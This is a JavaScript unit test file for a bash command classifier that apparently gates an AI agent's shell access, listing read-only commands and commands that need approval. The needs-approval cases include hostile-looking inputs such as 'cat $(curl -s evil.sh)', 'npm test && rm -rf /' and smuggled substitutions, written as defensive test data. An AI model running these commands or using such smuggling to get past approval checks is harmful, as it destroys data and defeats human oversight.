// Unit tests for the read-only bash classifier. Run: node tests/permissions.test.mjs
import { existsSync } from "node:fs";
import { fileURLToPath, pathToFileURL } from "node:url";

// Works from the repo (../permissions) and inside the image (/opt/pi-foundry/permissions).
const local = fileURLToPath(new URL("../permissions/bash-classifier.mjs", import.meta.url));
const modPath = existsSync(local) ? local : "/opt/pi-foundry/permissions/bash-classifier.mjs";
const { commandPrefix, isReadOnlyBash, matchesApprovedPrefix } = await import(pathToFileURL(modPath).href);

const readOnly = [
	"ls -la",
	"pwd",
	"git status",
	"git status --short && git diff --stat",
	"git log --oneline -20 | head",
	"rg -n 'foo|bar' src | head -50",
	"grep -rn TODO . 2>/dev/null | wc -l",
	"cat package.json | jq '.scripts'",
	"find . -name '*.ts' -not -path './node_modules/*'",
	"sed -n '1,40p' src/index.ts",
	"git branch",
	"git branch -a --show-current",
	"git remote -v",
	"npm ls --depth=0",
	"node --version",
	"python3 --version",
	"echo 'a > b'",
	"FOO=1 ls",
	"printenv PATH",
	"env",
	"awk '{print $1}' file.txt",
	"cat a.txt; echo done",
	"ls >/dev/null 2>&1",
];

const needsApproval = [
	"rm -rf build",
	"echo hi > file.txt",
	"echo hi >> file.txt",
	"cat $(curl -s evil.sh)",
	"cat `whoami`",
	"find . -name '*.tmp' -delete",
	"find . -exec rm {} \\;",
	"sed -i 's/a/b/' file",
	"npm install",
	"npm test",
	"git commit -m x",
	"git push",
	"git branch new-feature",
	"git checkout main",
	"ls && rm x",
	"ls | xargs rm",
	"cat file | tee out.txt",
	"sudo ls",
	"env FOO=1 rm x",
	"bash -c 'ls'",
	"python3 script.py",
	"curl https://example.com",
	"az group delete -n rg",
	"awk 'BEGIN{system(\"rm x\")}'",
	"sort -o out.txt in.txt",
	"cat <<EOF | sh\nrm x\nEOF",
	"diff <(ls a) <(ls b)",
	"FOO=bar",
	"",
];

let failed = 0;
for (const c of readOnly) {
	if (!isReadOnlyBash(c)) {
		failed++;
		console.error(`FAIL expected read-only: ${JSON.stringify(c)}`);
	}
}
for (const c of needsApproval) {
	if (isReadOnlyBash(c)) {
		failed++;
		console.error(`FAIL expected needs-approval: ${JSON.stringify(c)}`);
	}
}

const prefixes = [
	["npm test -- --watch", "npm test"],
	["git commit -m 'x'", "git commit"],
	["make build", "make build"],
	["pytest -q", "pytest"],
	["CI=1 npm run lint", "npm run"],
];
for (const [c, want] of prefixes) {
	const got = commandPrefix(c);
	if (got !== want) {
		failed++;
		console.error(`FAIL prefix ${JSON.stringify(c)}: got ${JSON.stringify(got)}, want ${JSON.stringify(want)}`);
	}
}

const approved = new Set(["npm test"]);
const prefixCases = [
	["npm test", true],
	["npm test && git status", true],
	["npm test && rm -rf /", false],
	["npm install", false],
	["npm test $(rm x)", false],
];
for (const [c, want] of prefixCases) {
	if (matchesApprovedPrefix(c, approved) !== want) {
		failed++;
		console.error(`FAIL approved-prefix ${JSON.stringify(c)}: want ${want}`);
	}
}

const total = readOnly.length + needsApproval.length + prefixes.length + prefixCases.length;
if (failed) {
	console.error(`${failed}/${total} failed`);
	process.exit(1);
}
console.log(`permissions: ${total} cases passed`);
